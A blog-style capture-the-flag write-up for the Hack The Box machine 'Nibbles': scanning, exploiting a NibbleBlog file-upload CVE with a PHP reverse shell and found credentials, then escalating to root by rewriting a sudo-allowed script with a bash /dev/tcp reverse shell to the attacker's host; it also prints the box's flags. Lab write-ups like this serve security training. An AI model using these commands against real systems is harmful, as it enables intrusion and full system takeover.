+++
title = "HTB - Nibbles"
date = 2024-09-16
+++

<img alt="Image" async src="images/Nibbles.png" width="800px"></img>

Nibbles is a very smooth box that runs close to HTB standards for easier machines... Thorough web enumeration and simple privilege escalation. Let's get it.
### Scan
```
└─# nmap -sV -sC --open -p- 10.10.10.75
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 20:19 EDT
Nmap scan report for 10.10.10.75
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.30 seconds

```

### Enumeration

This box has two connections on ports 22 and 80, running their respective services. You know how I feel about SSH, so we'll start with port 80.

##### 80 - NibbleBlog

<img alt="Image" async src="images/Screenshot 2024-09-09 at 8.31.49 PM.png" width="800px"></img>

The landing page of the website doesn't give us much. However, when we take a closer look, we're given a bone. Using this newfound directory, we can feed feroxbuster (I know, no gobuster anymore) our parameters and get a lot of information.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 8.35.09 PM.png" width="800px"></img>

Moseying around some of these yields very valuable information, including usernames and versions. The kicker, though, comes from doing our research online.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 8.39.23 PM.png" width="800px"></img>

We find out about CVE-2015-6967, which allows us to upload unrestricted files to the server, and access via `content/private/plugins/my_image/image.php`. We also can find a python script built for this blog specifically, and even some credentials hanging around... (I'll take it!)

<img alt="Image" async src="images/Screenshot 2024-09-09 at 8.56.20 PM.png" width="800px"></img>

### Initial Access

Downloading the script, we need to find a PHP reverse shell that we can couple with it, because the script will give us access to our payload through the server. I used: `/usr/share/laudanum/php/php-reverse-shell.php`. Once the parameters are configured with hosts and credentials, set up a wrapped listener and fire away.

`rlwrap nc -nlvp XXXX`

`exploit.py  -l http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload php-reverse-shell.php`

Once we have a shell, we need to stabilize it

<img alt="Image" async src="images/Screenshot 2024-09-09 at 8.59.27 PM.png" width="800px"></img>

Then, we can navigate to the home directory for our flag.

`USER:2df045e9e5b920914459d4ae04491c9b`

### Privilege Escalation

Once in our shell and looking to move vertically, we can run `sudo -l` to get an idea of what we can and cannot do. As seen below, we've got access to the `monitor.sh` executable, which is great news for us.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 9.00.01 PM.png" width="800px"></img>

All that needs to be done is overwrite the original script with a Bash one-liner pointing to another listener that we have set up on our Kali box.

The directory is hidden behind a zip file, so unzip.

<img alt="Image" async src="images/Screenshot 2024-09-09 at 9.04.05 PM.png" width="800px"></img>

Then, rewrite the script using the line below. `nano` and `vim` were being very touchy, so I just used `echo`.

```
echo -e '#!/bin/bash\n\n# Define the IP address and port of the remote listener\nREMOTE_IP="10.10.14.3" # Replace with your IP\nREMOTE_PORT="9001"        # Replace with your desired port\n\n# Ensure the script is running with root privileges\nif [[ "$EUID" -ne 0 ]]; then\n  echo "Please run this script as root."\n  exit 1\nfi\n\n# Attempt to open a reverse shell using netcat\necho "Opening a reverse shell to $REMOTE_IP:$REMOTE_PORT..."\n/bin/bash -i >& /dev/tcp/$REMOTE_IP/$REMOTE_PORT 0>&1' > monitor.sh
```

Once you've popped the root shell, `cd` to the directory and grab your flag.

`ROOT:1b7cbd064fd08f66523ddc338bf1b985`

#easy #linux #manual 


